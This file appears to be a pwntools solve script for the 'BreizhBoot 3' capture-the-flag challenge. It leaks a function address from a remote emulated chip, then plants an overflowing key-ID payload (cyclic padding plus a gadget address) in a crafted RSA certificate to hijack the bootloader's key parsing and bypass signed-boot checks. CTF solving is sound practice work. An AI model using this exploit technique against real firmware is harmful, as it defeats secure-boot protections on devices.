import struct
import argparse
from Crypto.PublicKey import RSA
from pwn import *


def compute_n0inv(n):
    """ Compute n0inv = -n^(-1) mod 2^32 """
    r = 2**32
    n0inv = pow(n, -1, r)  # Modular inverse of n mod 2^32
    return (-n0inv) % r  # Ensure it's positive


def compute_rr(n):
    """ Compute R^2 mod n for Montgomery multiplication (R = 2^(len(n)*32)) """
    r = 1 << (len(bin(n)) - 2)  # R = 2^(bit length of n)
    rr = (r * r) % n  # R^2 mod n
    # Convert to 32-bit words
    rr_words = [(rr >> (32 * i)) & 0xFFFFFFFF for i in range(32)]
    return rr_words


def generate_pubkey(input_pem, output_bin, key_id):
    """ Extract RSA public key parameters and write to binary file """
    with open(input_pem, "rb") as f:
        key = RSA.import_key(f.read())

    # Ensure the key is RSA 1024-bit
    if key.size_in_bits() != 1024:
        raise ValueError("This script only supports RSA 1024-bit keys.")

    # Extract modulus (n) and public exponent (e)
    n = key.n
    e = key.e

    # Compute n0inv and R^2 mod n
    n0inv = compute_n0inv(n)
    rr = compute_rr(n)

    # Convert modulus to 32-bit words (little-endian)
    rsa_pub_modulus = [(n >> (32 * i)) & 0xFFFFFFFF for i in range(32)]

    # Key identifier format
    KEY_ID = key_id

    # Write to binary file
    with open(output_bin, "wb") as f:
        f.write(b"BZH.CERT")  # magic bytes :)
        f.write(struct.pack("<Q", e))  # rsa_pub_exponent (8 bytes)
        f.write(struct.pack("<I", n0inv))  # rsa_n0inv (4 bytes)
        f.write(struct.pack("<32I", *rr))  # rsa_rr (128 bytes)
        # rsa_pub_modulus (128 bytes)
        f.write(struct.pack("<32I", *rsa_pub_modulus))
        f.write(struct.pack("<I", len(KEY_ID)))  # len_key_id (4 bytes)
        f.write(KEY_ID)

    print(f"Successfully created '{output_bin}' from '{input_pem}'.")


def format_disk(fit_path, cert_path, sig_path):
    # Create a 10MB disk image and format it as VFAT
    subprocess.run(
        ["dd", "if=/dev/zero", "of=fitdisk-solve.img", "bs=1M", "count=10"],
        check=True,
    )
    subprocess.run(["mformat", "-i", "fitdisk-solve.img", "::"], check=True)

    # Use FUSE-based mount with fusefat
    subprocess.run(
        ["mcopy", "-i", "fitdisk-solve.img", fit_path, "::"], check=True
    )

    subprocess.run(
        ["mcopy", "-i", "fitdisk-solve.img", cert_path, "::"], check=True
    )

    subprocess.run(
        ["mcopy", "-i", "fitdisk-solve.img", sig_path, "::"], check=True
    )

    print("Disk formatted and all files copied successfully.")


def flash_chip(remote_conn, file_path):
    print("Flashing...")
    try:
        with open(file_path, "rb") as f:
            file_data = f.read()
    except IOError:
        print(
            f"Error: Unable to open file {file_path}. Ensure you have permission to read the file.")
        return

    if len(file_data) > 12 * 1024 * 1024:
        print("Error: File too large (must be under 12MB)")
        return

    b64_data = base64.b64encode(file_data).decode('utf-8')
    remote_conn.sendline(b"1")  # Select Flash chip memory option
    remote_conn.recvuntil(b"disk: ")
    remote_conn.sendline(b64_data.encode('utf-8'))

    response = remote_conn.recvline().decode('utf-8')
    print(response)
    print("Flashed.")


def kill_qemu(remote_conn):
    remote_conn.sendline(b"3")  # Select kill all qemu
    response = remote_conn.recvline()
    print(response)


def interactive_clean(proc):
    while True:
        try:
            line = proc.recvline(timeout=1).decode().replace(
                "\r", "")  # Timeout after 1 sec
            print(line, end="")
        except EOFError:
            print("\n[ERREUR] Processus terminé.")
            break
        except Timeout:
            print("\n[ERREUR] Temps d'attente dépassé, aucune réponse reçue.")
        except KeyboardInterrupt:
            print("\n[INFO] Fermeture de la connexion.")
            proc.close()
            break


def boot_chip(remote_conn):
    remote_conn.sendline(b"2")  # Select Boot chip option


def crypto_stuff(fitImage_path: str):
    os.system(
        "openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:1024")
    os.system(
        f"openssl dgst -sha256 -sign private.pem -out signature.bin {fitImage_path}")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Solve for BreizhBoot 3.")
    parser.add_argument("fit_image", help="FitImage path")
    parser.add_argument("ip", help="Ip to remote server")
    parser.add_argument("port", help="Port to remote service")
    args = parser.parse_args()

    crypto_stuff(args.fit_image)
    r = remote(args.ip, int(args.port))

    PAYLOAD = b"COUCOU"
    KEY_OUT = "pubkey.breizhcertificate"

    generate_pubkey("private.pem", KEY_OUT, PAYLOAD)

    format_disk(args.fit_image, KEY_OUT, "./signature.bin")
    flash_chip(r, "./fitdisk-solve.img")
    boot_chip(r)

    r.recvuntil(b"&parse_pubkey=")
    addr_func = int(r.recvline().decode().strip(), 16)
    print(f"&parse_pubkey={addr_func}")
    r.close()

    gdg_ret_0 = addr_func + 960

    PAYLOAD = cyclic(312)+p64(0)+p64(0)+p64(gdg_ret_0)
    KEY_OUT = "pubkey.breizhcertificate"

    generate_pubkey("private.pem", KEY_OUT, PAYLOAD)

    format_disk(args.fit_image, KEY_OUT, "./signature.bin")

    r = remote(args.ip, int(args.port))
    kill_qemu(r)
    flash_chip(r, "./fitdisk-solve.img")
    boot_chip(r)
    r.interactive()
